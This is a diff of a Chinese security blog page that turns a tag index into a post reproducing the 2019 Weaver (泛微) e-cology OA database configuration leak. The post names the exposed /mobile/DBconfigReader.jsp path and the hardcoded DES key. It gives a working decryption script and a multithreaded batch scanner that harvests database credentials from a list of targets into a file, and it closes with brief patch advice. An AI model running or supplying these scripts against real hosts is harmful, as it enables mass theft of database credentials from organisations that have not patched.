@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="网络安全">
+  <meta name="keywords" content="信息泄露,">
 
 
 
@@ -83,14 +83,22 @@
 
 
 
-<meta name="keywords" content="web安全 代码审计">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Boogle&#39;s Blog">
-<meta property="og:url" content="http://zhengbao.wang/tags/ctf/index.html">
+<meta name="description" content="0x00 前言泛微又双叒出问题了，2019年10月24日泛微OA被爆出数据库配置信息泄露，攻击者可通过访问指定页面获取加密的数据库配置信息，下面进行漏洞复现。 0x01 漏洞复现发生信息泄露的页面为/mobile/DBconfigReader.jsp 访问可查看到一串乱码，返回一行乱码即表明漏洞存在。  此串乱码即为数据库配置信息经过DES加密后的结果，而默认密钥在源码中可查看为1z2x3c4v5">
+<meta name="keywords" content="信息泄露">
+<meta property="og:type" content="article">
+<meta property="og:title" content="泛微OA数据库配置信息泄露漏洞">
+<meta property="og:url" content="http://zhengbao.wang/泛微OA数据库配置信息泄露漏洞/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blog">
+<meta property="og:description" content="0x00 前言泛微又双叒出问题了，2019年10月24日泛微OA被爆出数据库配置信息泄露，攻击者可通过访问指定页面获取加密的数据库配置信息，下面进行漏洞复现。 0x01 漏洞复现发生信息泄露的页面为/mobile/DBconfigReader.jsp 访问可查看到一串乱码，返回一行乱码即表明漏洞存在。  此串乱码即为数据库配置信息经过DES加密后的结果，而默认密钥在源码中可查看为1z2x3c4v5">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/10/30/mQRcnEI2qxdbLvK.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/30/suPlO5JjhiMg4BG.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/30/JMa8hCTNin9PeI6.png">
+<meta property="og:updated_time" content="2019-10-30T11:18:39.393Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Boogle&#39;s Blog">
+<meta name="twitter:title" content="泛微OA数据库配置信息泄露漏洞">
+<meta name="twitter:description" content="0x00 前言泛微又双叒出问题了，2019年10月24日泛微OA被爆出数据库配置信息泄露，攻击者可通过访问指定页面获取加密的数据库配置信息，下面进行漏洞复现。 0x01 漏洞复现发生信息泄露的页面为/mobile/DBconfigReader.jsp 访问可查看到一串乱码，返回一行乱码即表明漏洞存在。  此串乱码即为数据库配置信息经过DES加密后的结果，而默认密钥在源码中可查看为1z2x3c4v5">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/30/mQRcnEI2qxdbLvK.png">
 
 
 
@@ -120,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="http://zhengbao.wang/tags/ctf/">
+  <link rel="canonical" href="http://zhengbao.wang/泛微OA数据库配置信息泄露漏洞/">
 
 
 
 
 
-  <title>标签: ctf | Boogle's Blog</title>
+  <title>泛微OA数据库配置信息泄露漏洞 | Boogle's Blog</title>
   
 
 
@@ -148,7 +156,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -284,234 +292,302 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block tag">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>ctf<small>标签</small>
-        </h1>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://zhengbao.wang/泛微OA数据库配置信息泄露漏洞/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/boogle.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/regexp盲注/" itemprop="url">
-              
-                <span itemprop="name">regexp盲注</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">泛微OA数据库配置信息泄露漏洞</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-26T15:14:21+08:00" content="2018-11-26">
-          11-26
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-30T17:07:48+08:00">
+                2019-10-30
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/泛微OA数据库配置信息泄露漏洞/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/泛微OA数据库配置信息泄露漏洞/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/泛微OA数据库配置信息泄露漏洞/" class="leancloud_visitors" data-flag-title="泛微OA数据库配置信息泄露漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  551 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/sql注入-服务端模板注入（SSTI）/" itemprop="url">
-              
-                <span itemprop="name">sql注入 & 服务端模板注入（SSTI）</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-21T15:10:31+08:00" content="2018-11-21">
-          11-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/session反序列化-soap-ssrf-crlf/" itemprop="url">
-              
-                <span itemprop="name">session反序列化+soap(ssrf+crlf)</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-21T15:06:36+08:00" content="2018-11-21">
-          11-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>泛微又双叒出问题了，2019年10月24日泛微OA被爆出数据库配置信息泄露，攻击者可通过访问指定页面获取加密的数据库配置信息，下面进行漏洞复现。</p>
+<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>发生信息泄露的页面为<code>/mobile/DBconfigReader.jsp</code></p>
+<p>访问可查看到一串乱码，返回一行乱码即表明漏洞存在。</p>
+<p><img src="https://i.loli.net/2019/10/30/mQRcnEI2qxdbLvK.png" alt></p>
+<p>此串乱码即为数据库配置信息经过DES加密后的结果，而默认密钥在源码中可查看为<code>1z2x3c4v5b6n</code></p>
+<p><img src="https://i.loli.net/2019/10/30/suPlO5JjhiMg4BG.png" alt></p>
+<p>验证脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desdecode</span><span class="params">(secret_key, s)</span>:</span></span><br><span class="line">	cipherX = pyDes.des(<span class="string">'        '</span>)</span><br><span class="line">	cipherX.setKey(secret_key)</span><br><span class="line">	y = cipherX.decrypt(s)</span><br><span class="line">	<span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_decode</span><span class="params">(res)</span>:</span></span><br><span class="line">	data = desdecode(<span class="string">'1z2x3c4v5b6n'</span>, res.strip())</span><br><span class="line">	data = data.strip()</span><br><span class="line">	<span class="keyword">print</span> str(data)</span><br><span class="line">	<span class="keyword">return</span> str(data)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	url = <span class="string">'http://zhengbao.wang/mobile/DBconfigReader.jsp'</span></span><br><span class="line">	res = requests.get(url).content</span><br><span class="line">	info_decode(res)</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/10/30/JMa8hCTNin9PeI6.png" alt></p>
+<p>批量检测脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls,threads)</span>:</span></span><br><span class="line"></span><br><span class="line">		self.vb_urls = Queue.Queue()</span><br><span class="line">		self.threads = threads</span><br><span class="line">		<span class="keyword">for</span> u <span class="keyword">in</span> urls:</span><br><span class="line">			self.vb_urls.put(u[<span class="number">0</span>])</span><br><span class="line">		<span class="comment">#print self.vb_urls.get()</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">vb5_rce</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">with</span> threading.Lock():</span><br><span class="line">			<span class="keyword">while</span> self.vb_urls.qsize() &gt; <span class="number">0</span>:</span><br><span class="line">				target = self.vb_urls.get()</span><br><span class="line">				<span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">					target = <span class="string">'http://'</span>+target</span><br><span class="line">				headers = &#123;</span><br><span class="line">				<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'</span>,</span><br><span class="line">				<span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">				<span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">				<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">				 &#125;</span><br><span class="line">				url=target+<span class="string">'/mobile/DBconfigReader.jsp'</span></span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">					res=requests.get(url=url,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">					<span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">						<span class="keyword">if</span> (<span class="string">'\r\n\r\n'</span> <span class="keyword">in</span> res.text) <span class="keyword">and</span> (<span class="string">':'</span> <span class="keyword">in</span> res.content) <span class="keyword">and</span> <span class="string">'java'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">							info = info_decode(res.content)</span><br><span class="line">							<span class="keyword">if</span> <span class="string">'user'</span> <span class="keyword">in</span> info:</span><br><span class="line">								<span class="keyword">print</span> <span class="string">'[+] Vuluable :'</span>+url+<span class="string">'     '</span>+res.text</span><br><span class="line">								file_write(<span class="string">'e-cology-dbinfo.txt'</span>,url+<span class="string">'  |   '</span>+info+<span class="string">'\n'</span>)</span><br><span class="line">						<span class="keyword">else</span>:</span><br><span class="line">							<span class="keyword">print</span> <span class="string">'[-] NotVuluable :'</span>+url</span><br><span class="line">							</span><br><span class="line">					<span class="keyword">else</span>:</span><br><span class="line">						<span class="keyword">print</span> <span class="string">"[-] Not access :"</span>+str(res.status_code)+<span class="string">' | '</span>+url</span><br><span class="line">				<span class="keyword">except</span>:</span><br><span class="line">					<span class="keyword">print</span> <span class="string">'[!] Error :'</span>+url</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span>  range(self.threads):</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'[+] thread '</span>+ str(i)</span><br><span class="line">			t = threading.Thread(target=self.vb5_rce)</span><br><span class="line">			t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">'e-cology-jsp-info.txt'</span>,<span class="string">'r'</span>)  <span class="keyword">as</span> f:</span><br><span class="line">		r = json.loads(f.read())</span><br><span class="line">		urls = r[<span class="string">'results'</span>]</span><br><span class="line">		<span class="keyword">return</span> urls</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_write</span><span class="params">(name,results)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,mode=<span class="string">'a'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(results)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">desdecode</span><span class="params">(secret_key, s)</span>:</span></span><br><span class="line">	cipherX = pyDes.des(<span class="string">'        '</span>)</span><br><span class="line">	cipherX.setKey(secret_key)</span><br><span class="line">	y = cipherX.decrypt(s)</span><br><span class="line">	<span class="keyword">return</span> y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_decode</span><span class="params">(res)</span>:</span></span><br><span class="line">	data = desdecode(<span class="string">'1z2x3c4v5b6n'</span>, res.strip())</span><br><span class="line">	data = data.strip()</span><br><span class="line">	<span class="comment">#print str(data)</span></span><br><span class="line">	<span class="keyword">return</span> str(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	urls = get_url()</span><br><span class="line">	vb5_rce = Bruter(urls=urls,threads=<span class="number">20</span>)</span><br><span class="line">	vb5_rce.run()</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h2><ul>
+<li><p>官方安全补丁<a href="https://www.weaver.com.cn/cs/securityDownload.asp" target="_blank" rel="noopener"> https://www.weaver.com.cn/cs/securityDownload.asp </a></p>
+</li>
+<li><p>禁止访问<code>mobile/DBconfigReader.jsp</code></p>
+</li>
+</ul>
+<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak/blob/master/OA.py" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak/blob/master/OA.py</a></p>
+<p><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">https://github.com/jas502n/DBconfigReader</a></p>
 
       
-        
+    </div>
+    
+    
+    
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/Unicode安全/" itemprop="url">
-              
-                <span itemprop="name">Unicode安全</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-12T15:44:52+08:00" content="2018-11-12">
-          11-12
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+    <div>
       
         
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/jsondecode解编码绕过sqlWAF/" itemprop="url">
-              
-                <span itemprop="name">jsondecode解编码绕过sqlWAF</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-11-12T15:43:04+08:00" content="2018-11-12">
-          11-12
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/无字母数字shell/" itemprop="url">
-              
-                <span itemprop="name">无字母数字shell</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-08-08T15:31:52+08:00" content="2018-08-08">
-          08-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/python沙箱逃逸/" itemprop="url">
-              
-                <span itemprop="name">python沙箱逃逸</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-04-29T21:40:06+08:00" content="2018-04-29">
-          04-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/md5-true-引发的sql注入/" itemprop="url">
-              
-                <span itemprop="name">md5($str,true)引发的sql注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-01-25T15:12:31+08:00" content="2018-01-25">
-          01-25
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/泛微OA数据库配置信息泄露漏洞/">泛微OA数据库配置信息泄露漏洞</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
+  <p><span>发布时间:</span>2019年10月30日 - 17:07</p>
+  <p><span>最后更新:</span>2019年10月30日 - 19:18</p>
+  <p><span>原始链接:</span><a href="/泛微OA数据库配置信息泄露漏洞/" title="泛微OA数据库配置信息泄露漏洞">http://zhengbao.wang/泛微OA数据库配置信息泄露漏洞/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://zhengbao.wang/泛微OA数据库配置信息泄露漏洞/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
 
       
     </div>
 
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>感觉写的不错，给买个棒棒糖呗</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="boogle 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="boogle 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/信息泄露/" rel="tag"><i class="fa fa-tag"></i> 信息泄露</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/nginx-php-fpm远程代码执行漏洞/" rel="next" title="nginx+php-fpm远程代码执行漏洞">
+                <i class="fa fa-chevron-left"></i> nginx+php-fpm远程代码执行漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -519,6 +595,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -539,8 +622,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -660,6 +752,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-修复建议"><span class="nav-number">3.</span> <span class="nav-text">0x02 修复建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考链接"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -830,6 +938,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
